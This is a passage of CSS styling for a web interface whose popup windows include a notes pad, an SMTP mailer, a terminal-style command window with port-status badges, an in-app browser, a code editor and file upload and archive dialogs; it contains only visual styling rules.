            box-shadow: 0 8px 18px rgba(0,0,0,0.35);
            pointer-events: none;
            opacity: 0;
            transition: opacity .15s ease, transform .15s ease;
            z-index: 9999;
        }
        .term-action[data-label]:hover::after, .btn-icon[data-label]:hover::after {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .term-action[data-label]::before, .btn-icon[data-label]::before {
            content: "";
            position: absolute;
            left: 50%;
            bottom: -18px;
            transform: translateX(-50%);
            border: 6px solid transparent;
            border-top-color: #0b1320;
            opacity: 0;
            transition: opacity .15s ease;
            z-index: 9999;
        }
        .term-action[data-label]:hover::before, .btn-icon[data-label]:hover::before { opacity: 1; }
        /* Notes popup window */
.notes-window { position: fixed; top: 120px; left: 80px; width: min(92vw, 520px); max-height: 80vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
        .notes-window.show { display:block; }
        .notes-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .notes-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .notes-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .notes-close:hover { background: rgba(255,255,255,0.06); }
        .notes-body { padding:10px; }
        .notes-list { display:flex; flex-direction:column; gap:10px; }
        .note-item { border:1px solid var(--border); border-radius:8px; background: rgba(8,10,12,0.25); padding:8px; }
        .note-text { width:100%; min-height:120px; resize: vertical; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; box-sizing: border-box; }
.note-text:focus { outline:none; border-color: Chartreuse; box-shadow: 0 0 0 2px rgba(127,255,0,0.18); caret-color: Chartreuse; }
        .note-actions { display:flex; align-items:center; justify-content:flex-end; gap:6px; padding-top:6px; }
        .note-actions .btn-copy { color:#ffffff; }
        .note-actions .btn-delete { color:#ff5b5b; }
        .notes-actions { display:flex; align-items:center; justify-content:space-between; gap:8px; padding:8px 10px 12px; }
        .notes-actions .btn { color:#cfd6df; }
        /* Mailer popup window */
.mailer-window { position: fixed; top: 100px; left: 60px; width: min(92vw, 580px); max-height: 85vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
        .mailer-window.show { display:block; }
        .mailer-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .mailer-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .mailer-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .mailer-close:hover { background: rgba(255,255,255,0.06); }
        .mailer-body { padding:12px; }
        .mailer-form { display:flex; flex-direction:column; gap:12px; }
        .mailer-field { display:flex; flex-direction:column; gap:4px; }
        .mailer-field label { display:flex; align-items:center; gap:6px; font-size:13px; font-weight:500; color:#e8f0f7; }
.mailer-field label .material-symbols-rounded { font-size:18px; color: Chartreuse; }
        .mailer-field input, .mailer-field textarea { border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: inherit; }
        .mailer-field input:focus, .mailer-field textarea:focus { outline:none; border-color: Chartreuse; box-shadow: 0 0 0 2px rgba(127,255,0,0.18); caret-color: Chartreuse; }
        /* SMTP controls styling */
        #mailer-use-smtp { accent-color: Chartreuse; }
        #mailer-smtp-secure { border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: inherit; }
        #mailer-smtp-secure:focus { outline:none; border-color: Chartreuse; box-shadow: 0 0 0 2px rgba(127,255,0,0.18); }
        #file-ext-select { border:0; border-radius:6px; padding:0; background: transparent; color:#e8f0f7; font-family: inherit; }
        #file-ext-select:focus { outline:none; }
        .mailer-format-toggle { display:flex; gap:12px; margin:4px 0; }
        .mailer-format-toggle label { display:flex; align-items:center; gap:6px; font-size:12px; cursor:pointer; }
        .mailer-format-toggle label .material-symbols-rounded { font-size:18px; color: Chartreuse; }
        .mailer-format-toggle input[type="radio"] { margin:0; accent-color: Chartreuse; }
        .mailer-smtp-toggle { display:flex; gap:12px; margin:4px 0; }
        .mailer-smtp-toggle label { display:flex; align-items:center; gap:6px; font-size:12px; cursor:pointer; }
        .mailer-smtp-toggle label .material-symbols-rounded { font-size:18px; color: Chartreuse; }
        .mailer-smtp-toggle input[type="checkbox"] { margin:0; accent-color: Chartreuse; }
        .mailer-actions { display:flex; align-items:center; justify-content:space-between; gap:12px; padding-top:8px; }
        /* Mailer controls: icon-only buttons */
.mailer-send, .mailer-pause, .mailer-resume { width:34px; height:34px; padding:0; border-radius:17px; display:inline-flex; align-items:center; justify-content:center; background: transparent; color: Chartreuse; border:1px solid Chartreuse; cursor:pointer; position:relative; }
        .mailer-send .material-symbols-rounded, .mailer-pause .material-symbols-rounded, .mailer-resume .material-symbols-rounded { font-size:22px; }
        .mailer-send:hover, .mailer-pause:hover, .mailer-resume:hover { background: rgba(124,252,0,0.12); box-shadow: 0 0 0 2px rgba(124,252,0,0.18); }
        .mailer-send:disabled, .mailer-pause:disabled, .mailer-resume:disabled { opacity: 0.6; cursor: not-allowed; }
        .mailer-status { font-size:12px; color:#9aa3af; }
        .mailer-capability { display:flex; align-items:center; gap:6px; font-size:12px; color:#9aa3af; }
        .mailer-cap-badge { width:10px; height:10px; border-radius:50%; background:#9aa3af; box-shadow: 0 0 0 2px rgba(127,255,0,0.18) inset; }
        .mailer-cap-badge.ok { background:#7fff00; }
        .mailer-cap-badge.err { background:#ff3b3b; }
        .mailer-output { max-height: 220px; overflow:auto; white-space: pre-wrap; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; background: rgba(6,8,10,0.22); border:1px solid var(--border); border-radius:6px; padding:8px; margin-top:8px; color:#cfd6df; }
        .mailer-output .pending { color:#9aa3af; }
        .mailer-output .ok { color: Chartreuse; }
        .mailer-output .err { color:#ff7b7b; }
        * { scrollbar-width: thin; scrollbar-color: Chartreuse rgba(0,0,0,0.35); }
        *::-webkit-scrollbar { width: 10px; height: 10px; }
        *::-webkit-scrollbar-track { background: rgba(0,0,0,0.35); border-radius: 9999px; }
        *::-webkit-scrollbar-thumb { background: Chartreuse; border-radius: 9999px; background-clip: padding-box; border: 2px solid rgba(0,0,0,0.30); box-shadow: 0 0 0 2px rgba(127,255,0,0.20) inset; }
        *::-webkit-scrollbar-thumb:hover { filter: brightness(1.08); }
        *::-webkit-scrollbar-thumb:active { filter: brightness(1.02); box-shadow: 0 0 0 2px rgba(127,255,0,0.28) inset; }
        /* Context menu and Paste window */
        .ctx-menu { position: fixed; min-width: 220px; border:1px solid var(--border); border-radius: 10px; background: rgba(16,18,22,0.90); backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10020; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
        .ctx-menu.show { display:block; }
        .ctx-menu .ctx-item { display:flex; align-items:center; justify-content:space-between; gap:10px; width:100%; padding:8px 12px; background: transparent; color:#cfd6df; border:0; text-align:left; cursor:pointer; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; font-weight: 500; letter-spacing: 0.2px; }
        .ctx-menu .ctx-item:hover { background: rgba(255,255,255,0.06); }
.ctx-menu .ctx-item .material-symbols-rounded { color: Chartreuse; font-size:18px; }
        .ctx-menu .ctx-kbd { margin-left:auto; font-size:12px; color:#9aa4b2; }
        .ctx-sep { height:1px; margin:4px 8px; background: rgba(255,255,255,0.08); border:0; }
        .paste-window { position: fixed; top: 180px; left: 160px; width: min(92vw, 520px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10021; }
        .paste-window.show { display:block; }
        .paste-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; }
        .paste-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .paste-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .paste-close .material-symbols-rounded { color:#aab3be; }
        .paste-close:hover { background: rgba(255,255,255,0.06); }
        .paste-body { padding:12px; }
        .paste-area { width:100%; min-height:120px; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; }
        .paste-actions { display:flex; align-items:center; justify-content:flex-end; gap:8px; padding-top:8px; }
        .paste-btn { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; }
        .paste-btn:hover { background: rgba(255,255,255,0.06); }
        #paste-insert .material-symbols-rounded { color: Chartreuse; }
        #paste-insert-run .material-symbols-rounded { color: Chartreuse; }
        #paste-cancel .material-symbols-rounded { color: DarkRed; }
        /* Browser popup window */
        .browser-window { position: fixed; top: 140px; left: 100px; width: min(94vw, 860px); height: min(80vh, 600px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.65); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); display:none; z-index: 10000; }
        .browser-window.show { display:block; }
        .browser-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .browser-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .browser-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .browser-close:hover { background: rgba(255,255,255,0.06); }
        .browser-body { display:flex; flex-direction:column; height: calc(100% - 42px); }
        .browser-controls { display:flex; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.25); }
        .browser-url { flex:1; min-width:0; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; }
        .browser-go { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; text-decoration:none; display:inline-flex; align-items:center; gap:6px; }
        .browser-go:hover { background: rgba(255,255,255,0.06); }
        .browser-frame { flex:1; border:0; background:#0a0c10; }
        .browser-help { padding:6px 10px; font-size:12px; color:#9aa3af; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); }
        /* Landing mode for in-app browser */
        .browser-body.landing .browser-controls,
        .browser-body.landing .browser-frame,
        .browser-body.landing .browser-help { display:none; }
        /* CMD (terminal-like) popup window */
        .cmd-window { position: fixed; top: 160px; left: 120px; width: min(92vw, 720px); height: min(76vh, 520px); border:none; border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 9999; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
        .cmd-window.show { display:block; }
        /* Compact CMD-style notification popup */
        .cmd-notify-window { position: fixed; top: 180px; left: 140px; width: min(92vw, 560px); max-height: 60vh; border:none; border-radius: 12px; background: rgba(16,18,22,0.18); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.25); color:#cfd6df; display:none; z-index: 10002; }
        .cmd-window:focus, .cmd-window:focus-visible, .cmd-notify-window:focus, .cmd-notify-window:focus-visible { outline: none; }
        .cmd-notify-window.show { display:block; }
        .cmd-notify-body { display:flex; flex-direction:column; }
        .cmd-notify-icon { display:flex; align-items:center; justify-content:center; padding:12px; }
        .cmd-notify-icon svg { width:32px; height:32px; }
        .cmd-notify-output { padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; white-space:pre-wrap; background: rgba(6,8,10,0.12); }
        .cmd-notify-output .connected { color: Chartreuse; }
        .cmd-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.12); border-radius:12px 12px 0 0; cursor: move; user-select: none; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
        .cmd-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
        .cmd-actions { display:flex; align-items:center; gap:8px; margin-left:auto; }
        .cmd-btn { width:28px; height:28px; border-radius:14px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .cmd-btn:hover { background: rgba(255,255,255,0.08); color:#e6e9ef; }
.cmd-btn .material-symbols-rounded { color: Chartreuse; font-size:18px; }
        .cmd-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .cmd-close:hover { background: rgba(255,255,255,0.06); }
        .cmd-body { display:flex; flex-direction:column; height: calc(100% - 42px); font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
        .cmd-output { flex:1; padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; overflow:auto; white-space:pre-wrap; background: rgba(6,8,10,0.22); }
        .cmd-input-row { display:flex; align-items:center; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.14); }
        .cmd-prompt { color:#9aa3af; font-family: 'Ubuntu Mono', 'Courier New', monospace; }
        .cmd-input { flex:1; border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; transition: background-color .16s ease, border-color .16s ease, box-shadow .16s ease; }
        .cmd-input:hover { background: rgba(0,0,0,0.35); border-color: Chartreuse; }
        .cmd-input:focus, .cmd-input:focus-visible { outline:none; border-color: Chartreuse; background: rgba(0,0,0,0.30); box-shadow: 0 0 0 2px rgba(127,255,0,0.18); }
        .cmd-input::placeholder { color:#9aa3af; }
.cmd-output .ok { color: Chartreuse; }
.cmd-output .err { color:#ff7b7b; }
.cmd-output .sys { color:#92a3b5; }
.cmd-output .searching { color: Chartreuse; }
.cmd-output .port-badge { display:inline-block; border:1px solid var(--border); border-radius:9999px; padding:0 6px; margin-left:6px; font-size:10px; line-height:1; vertical-align:middle; white-space:nowrap; background: rgba(255,255,255,0.06); }
.cmd-output .port-badge.open { color: Chartreuse; border-color: Chartreuse; }
.cmd-output .port-badge.closed { color: Crimson; border-color: Crimson; background: rgba(139,0,0,0.12); }
/* Logo green for special command lines */
.cmd-output .logo { color: Chartreuse; text-align: center; }
        /* Live typing line inside terminal output */
        .cmd-live { padding:10px; }
        .cmd-prompt .u { color:#60a5fa; }
        .cmd-prompt .h { color:#22d3ee; }
.cmd-prompt .dir { color: Chartreuse; }
        .cmd-prompt .sym { color:#9aa3af; }
        /* Wallpaper changer window */
.wallpaper-window { position: fixed; top: 120px; left: 80px; width: min(92vw, 520px); border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.60); backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10001; }
.wallpaper-window.show { display:block; }
        .wallpaper-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .wallpaper-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .wallpaper-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .wallpaper-close:hover { background: rgba(255,255,255,0.06); }
.wallpaper-body { padding:12px; display:grid; grid-template-columns: 1fr auto auto; grid-auto-rows: auto; gap:8px; align-items:center; }
.wp-url { grid-column: 1 / span 3; border:1px solid var(--border); border-radius:6px; padding:10px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-size: var(--textBase); }
.wp-btn { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:flex; align-items:center; gap:10px; }
.wp-btn { font-size: var(--textBase); line-height: 1.4; }
.wp-btn:hover { background: rgba(255,255,255,0.06); }
        .wp-thumb { width:48px; height:30px; border-radius:6px; border:1px solid var(--border); background-size: cover; background-position: center; background-repeat: no-repeat; box-shadow: inset 0 1px 0 rgba(255,255,255,0.06); }
        .wp-apply, .wp-reset { grid-column: 1 / span 3; justify-self: center; width: 160px; padding: 6px 10px; font-size: 13px; justify-content: center; text-align: center; }
        /* Make apply icon green (logo color) and reset icon red */
.wp-apply .material-symbols-rounded { color: Chartreuse; }
        .wp-reset .material-symbols-rounded { color: #ff3b3b; }
        .wallpaper-help { grid-column: 1 / span 3; padding-top:6px; font-size:12px; color:#9aa3af; }
        .wallpaper-footer { grid-column: 1 / span 3; padding:6px 10px; font-size:12px; color:#9aa3af; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); text-align:center; }
        .cmd-live .cmd-prompt { color: Chartreuse; }
        .cmd-cursor { display:inline-block; width:10px; height:1.2em; background: Chartreuse; animation: blink 1s steps(1) infinite; vertical-align: -2px; margin-left:2px; }
        .browser-landing { flex:1; display:none; align-items:center; justify-content:center; flex-direction:column; gap:14px; padding:20px; }
        .browser-body.landing .browser-landing { display:flex; }
        .browser-landing .landing-logo { display:flex; align-items:center; gap:12px; font-weight:800; font-size:42px; letter-spacing:0.4px; color:#e6eef7; }
        .browser-landing .logo-spinner { width:36px; height:36px; }
        .browser-landing .logo-o { width:36px; height:36px; }
        .browser-landing .logo-text { font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; text-transform: uppercase; }
        .browser-landing .landing-form { display:flex; gap:8px; width:min(720px, 92%); }
        .browser-landing .landing-input { flex:1; border:1px solid var(--border); border-radius:24px; padding:12px 16px; background: rgba(12,14,16,0.20); color:#e8f0f7; font-size: var(--textBase); }
        /* Unified green focus for popup inputs */
        .browser-landing .landing-input:focus,
        .browser-controls .browser-url:focus,
        .wallpaper-body .wp-url:focus,
        .settings-input:focus { outline:none; border-color: Chartreuse; box-shadow: 0 0 0 2px rgba(127,255,0,0.18); caret-color: Chartreuse; }
        .browser-landing .landing-submit { border:1px solid var(--border); border-radius:24px; padding:12px 18px; background: transparent; color:#cfd6df; cursor:pointer; }
        .browser-landing .landing-submit:hover { background: rgba(255,255,255,0.06); }
        .browser-landing .landing-tip { margin-top:6px; font-size:12px; color:#9aa3af; }
        .browser-landing .landing-small { font-size:12px; color:#9aa3af; letter-spacing:0.6px; text-transform: lowercase; margin-top:2px; }
        /* Clean OS popup window */
        .clean-window { position: fixed; top: 160px; left: 160px; width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10003; }
        .clean-window.show { display:block; }
        .clean-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.25); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .clean-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .clean-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .clean-close:hover { background: rgba(255,255,255,0.06); }
        .clean-body { padding:12px; display:flex; flex-direction:column; gap:10px; }
        .clean-icon-large { width:48px; height:48px; align-self:center; }
        .clean-intro { font-size:13px; color:#9aa3af; text-align:center; }
.clean-actions { display:flex; flex-direction: column; align-items:stretch; gap:8px; }
        .clean-actions .btn { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
        .clean-actions .btn:hover { background: rgba(255,255,255,0.06); }
        .clean-actions .btn .material-symbols-rounded { color: Chartreuse; }
        .clean-checks { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
        .clean-check { display:flex; gap:6px; align-items:center; font-size:13px; color:#cfd6df; }
        .clean-verify { border:1px solid var(--border); border-radius:6px; padding:8px; background: rgba(12,14,16,0.20); color:#e8f0f7; width: 240px; }
        .clean-result { padding:10px; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; white-space:pre-wrap; background: rgba(6,8,10,0.22); border:1px solid var(--border); border-radius:6px; }
        .clean-result .ok { color: Chartreuse; }
        .clean-result .err { color:#ff7b7b; }
        /* Editor popup window */
        .editor-window { position: fixed; top: 110px; left: 110px; width: min(94vw, 860px); height: min(80vh, 600px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
        .editor-window.show { display:block; }
        .editor-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        /* Upload, Add, and Rename popups */
      .upload-window, .add-window, .rename-window, .errors-window, .zip-window, .unzip-window, .how-window, .cmdhelp-window { position: fixed; top: 120px; left: 120px; width: min(94vw, 720px); height: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10005; }
      .upload-window.show, .add-window.show, .rename-window.show, .errors-window.show, .zip-window.show, .unzip-window.show, .how-window.show, .cmdhelp-window.show { display:block; }
      .upload-titlebar, .add-titlebar, .rename-titlebar, .errors-titlebar, .how-titlebar, .cmdhelp-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .upload-close, .add-close, .rename-close, .errors-close, .how-close, .cmdhelp-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        /* Header audio popover */
        .audio-popover { position: fixed; z-index: 10010; padding:8px 10px; border:1px solid var(--border); border-radius:8px; background: rgba(16,18,22,0.45); backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 10px 20px rgba(0,0,0,0.35); }
.audio-popover input[type="range"] { width: 180px; accent-color: Chartreuse; }
.upload-close:hover, .add-close:hover, .rename-close:hover, .errors-close:hover, .how-close:hover, .cmdhelp-close:hover { background: rgba(255,255,255,0.06); }
        .editor-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.upload-title, .add-title, .rename-title, .errors-title, .how-title, .cmdhelp-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        /* Inline operation status banner inside popups (centered overlay) */
        .upload-body, .add-body { position: relative; }
        .op-status { position: absolute; left:50%; top:50%; transform: translate(-50%, -50%); display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 14px; margin:0; border:1px solid rgba(255,255,255,0.10); border-radius:10px; background: rgba(0,0,0,0.28); text-align:center; z-index: 1000; max-width: 85%; box-shadow: 0 10px 22px rgba(0,0,0,0.30); }
        .op-status.ok { color: Chartreuse; }
        .op-status.err { color:#ff7b7b; }
        .editor-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .editor-close:hover { background: rgba(255,255,255,0.06); }
.editor-body { display:flex; flex-direction:column; height: calc(100% - 42px); position: relative; }
.editor-textarea { flex:1; border:0; background: rgba(6,8,10,0.22); color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; padding:10px; resize:none; outline:none; caret-color: Chartreuse; }
.editor-textarea::selection { background: Chartreuse; color:#000000; }
.editor-ace { flex:1; border:0; background: rgba(6,8,10,0.22); color:#e8f0f7; font-size:13px; line-height:1.6; padding:0; outline:none; }
.editor-ace .ace_gutter { background: rgba(10,12,16,0.30); }
.editor-ace .ace_print-margin { display:none; }
.editor-footer { display:flex; align-items:center; justify-content:flex-end; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20); }
/* Centered save overlay */
.editor-overlay { position: absolute; inset: 0; display: none; align-items: center; justify-content: center; background: rgba(10,12,16,0.55); backdrop-filter: blur(2px); z-index: 10; }
.editor-overlay.show { display: flex; }
.editor-overlay-content { text-align: center; color: #cfd6df; }
.editor-logo-spinner { width: 32px; height: 32px; }
.editor-overlay.error .logo-spinner circle.spin { animation: none; }
.editor-overlay.error .logo-spinner circle.base,
.editor-overlay.error .logo-spinner circle.spin { stroke: #ff6b6b; }
.editor-overlay-sub .saved-word { color: Chartreuse; font-weight: 600; }
.editor-overlay-sub { font-size: 13px; opacity: 0.85; margin-top: 6px; }
.editor-save { border:1px solid var(--border); border-radius:6px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
.editor-save:hover { background: rgba(255,255,255,0.06); }
.editor-save .material-symbols-rounded { color: Chartreuse; }
/* Editor undo button */
.editor-undo { border:1px solid var(--border); border-radius:6px; padding:8px 10px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
.editor-undo:hover { background: rgba(255,255,255,0.06); }
.editor-undo .material-symbols-rounded { color:#cfd6df; }
/* Editor redo button */
.editor-redo { border:1px solid var(--border); border-radius:6px; padding:8px 10px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
.editor-redo:hover { background: rgba(255,255,255,0.06); }
.editor-redo .material-symbols-rounded { color:#cfd6df; }
/* Editor command button removed */
/* Command output overlay removed */
/* Editor search UI */
.editor-search { display:inline-flex; align-items:center; gap:6px; margin-right:auto; }
.editor-search-input { width: 180px; border:1px solid var(--border); border-radius:6px; padding:6px 8px; background: rgba(12,14,16,0.20); color:#e8f0f7; outline:none; }
.editor-search-input:focus { border-color: Chartreuse; box-shadow: 0 0 0 1px rgba(127,255,0,0.22); }
.editor-search-btn { border:1px solid var(--border); border-radius:6px; padding:6px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; }
.editor-search-btn:hover { background: rgba(255,255,255,0.06); }
.editor-search-btn .material-symbols-rounded { color:#cfd6df; }
        /* APPTools 1.0 popup window */
        .apptools-window { position: fixed; top: 150px; left: 140px; width: min(92vw, 640px); max-height: 80vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.62); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10004; }
        .apptools-window.show { display:block; }
        .profile-window { position: fixed; top: 150px; left: 160px; width: min(92vw, 640px); max-height: 80vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(24,26,32,0.62); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10004; }
        .profile-window.show { display:block; }
        .profile-titlebar { display:flex; align-items:center; justify-content:space-between; gap:10px; padding:10px 12px; border-bottom:1px solid var(--border); background: rgba(16,18,22,0.42); }
        .profile-title { font-weight:700; }
        .profile-body { padding:12px; display:flex; flex-direction:column; gap:12px; }
        .profile-row { display:flex; gap:12px; align-items:center; flex-wrap:wrap; }
        .profile-pickers { display:flex; flex-direction:column; gap:8px; align-items:center; }
        .profile-field { display:flex; align-items:center; gap:10px; justify-content:center; }
        .profile-input { width: min(92%, 420px); padding:8px 10px; border:1px solid var(--border); border-radius:8px; background: rgba(6,8,10,0.22); color:#e8f0f7; outline:none; }
        .profile-input::placeholder { color: var(--muted); }
        .profile-preview { display:grid; place-items:center; margin: 0 auto; width: min(92%, 480px); }
        .profile-actions { display:flex; gap:10px; padding: 10px 12px; justify-content:flex-end; }
        .profile-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .profile-close .material-symbols-rounded { color: rgba(255,0,0,0.80); }
        .profile-close:hover { background: rgba(255,255,255,0.06); }
        .profile-pickers input[type="color"]{ width:32px; height:26px; padding:0; border:1px solid var(--border); border-radius:6px; background:transparent; }
        .profile-palette { display:grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap:8px; }
        .swatch { display:flex; align-items:center; gap:8px; border:1px solid var(--border); border-radius:8px; padding:8px; background: rgba(10,12,16,0.20); cursor:pointer; }
        .swatch:hover { background: rgba(255,255,255,0.06); }
        .swatch-color { width:18px; height:18px; border-radius:50%; border:1px solid var(--border); }
        .swatch-label { font-family: ui-monospace, Menlo, Monaco, Consolas, "Liberation Mono", monospace; font-size:12px; color:#d9e3ea; }
